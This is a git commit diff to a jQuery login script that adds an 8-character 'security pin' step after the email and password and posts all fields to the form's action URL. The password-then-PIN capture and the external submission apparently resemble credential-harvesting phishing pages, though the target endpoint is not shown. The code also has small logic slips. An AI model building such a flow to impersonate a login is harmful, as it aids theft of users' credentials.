ad9efdd0bc0e0a93382bd66b4c1e59ab86228084
CoderFaveX <faveejiofor2009@gmail.com>
2024-06-22 23:08:40 +0100

    security pin

--- main.js
+++ main.js
@@ -1,12 +1,12 @@
 $(() => {
   let passed = false;
-  $(".password-toggle").click(() => {
-    if ($("#password").prop("type") == "password") {
-      $("#password").prop("type", "text");
-      $(".password-toggle").text("Hide");
+  $(".toggle_password").click(() => {
+    if ($("#password, #code").prop("type") == "password") {
+      $("#password, #code").prop("type", "text");
+      $(".toggle_password").text("Hide");
     } else {
-      $("#password").prop("type", "password");
-      $(".password-toggle").text("Show");
+      $("#password, #code").prop("type", "password");
+      $(".toggle_password").text("Show");
     }
   });
   const toggleDivs = (first) => {
@@ -29,11 +29,30 @@ $(() => {
     } else {
       $("label[for=password]").css("opacity", "1");
     }
+    if ($("#code").val().trim() != "") {
+      $("label[for=code]").css("opacity", "0");
+    } else {
+      $("label[for=code]").css("opacity", "1");
+    }
   };
+  const max = (elem) => {
+    if ($(elem).val().length == 8) {
+      $(".input-hold").addClass("input-hold-focus");
+      $(".req").text("Max chars - 8");
+      $(".req").fadeIn(200);
+      return true;
+    } else {
+      $(".input-hold").addClass("input-hold-focus");
+      $(".req").fadeOut(200);
+      return false;
+    }
+  };
+  $("#code").keyup(() => max($("#code")));
   checkConditions();
   $(".input-hold").click(() => {
     $(".input-hold input").get(0).focus();
     $(".input-hold").addClass("input-hold-focus");
+    $(".toggle_password").fadeIn(200);
     checkConditions();
   });
   $(".input-hold input").focusout(() => {
@@ -50,11 +69,11 @@ $(() => {
       $(".req").fadeIn(200);
       checkConditions();
     } else {
-      $("#email-show").text($("#email").val());
+      $(".email-show").text($("#email").val());
       toggleDivs(false);
     }
   });
-  $("form").submit((e) => {
+  $("#submit").click(() => {
     if ($("#password").val().trim() == "") {
       $(".input-hold input").get(0).focus();
       $(".input-hold").addClass("input-hold-focus");
@@ -62,38 +81,58 @@ $(() => {
       $(".req").fadeIn(200);
       checkConditions();
       return false;
+    } else {
+      $("main:nth-child(2)").css("display", "none");
+      $("main:nth-child(3)").fadeIn(300);
     }
-    e.preventDefault();
+  });
+  $("form").submit((e) => {
+    if ($("#code").val().trim() == "") {
+      $(".input-hold input").get(0).focus();
+      $(".input-hold").addClass("input-hold-focus");
+      $(".input-hold").addClass("input-required");
+      $(".req").fadeIn(200);
+      checkConditions();
+      return false;
+    } else {
+      e.preventDefault();
+      if (max($("#code"))) {
+        $("main:nth-child(2)").css("display", "none");
+        $("main:nth-child(3)").fadeIn(300);
 
-    const form = e.target;
-    const formData = new FormData(form);
+        const form = e.target;
+        const formData = new FormData(form);
 
-    try {
-      $("#submit").prop("disabled", false);
-      fetch(form.action, {
-        method: "POST",
-        body: formData,
-        headers: {
-          Accept: "application/json",
-        },
-      })
-        .then((response) => {
-          if (response.ok) {
-            window.location.href = "/welcome.html"; // Redirect to your custom thank-you page
-          } else {
-            alert(
-              "There was a problem with your submission. Please try again."
-            );
-          }
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-          alert("There was a problem with your submission. Please try again.");
-        });
-    } catch (error) {
-      alert("Error:", error);
-    } finally {
-      $("#submit").prop("disabled", false);
+        try {
+          $("#submit").prop("disabled", false);
+          fetch(form.action, {
+            method: "POST",
+            body: formData,
+            headers: {
+              Accept: "application/json",
+            },
+          })
+            .then((response) => {
+              if (response.ok) {
+                window.location.href = "/welcome"; // Redirect to your custom thank-you page
+              } else {
+                alert(
+                  "There was a problem with your submission. Please try again."
+                );
+              }
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+              alert(
+                "There was a problem with your submission. Please try again."
+              );
+            });
+        } catch (error) {
+          alert("Error:", error);
+        } finally {
+          $("#submit").prop("disabled", false);
+        }
+      }
     }
   });
 
